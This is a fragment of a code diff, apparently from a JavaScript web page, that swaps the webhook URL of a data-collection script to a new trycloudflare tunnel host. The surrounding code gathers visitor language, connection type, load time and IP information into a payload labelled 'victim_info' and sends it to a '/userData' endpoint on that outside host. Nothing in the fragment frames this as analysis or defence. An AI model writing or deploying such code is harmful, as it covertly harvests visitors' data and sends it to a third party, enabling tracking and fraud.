@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://binding-endangered-acquisitions-modern.trycloudflare.com/userData";
+                const webhookURL = "https://keys-tuning-soldier-all.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
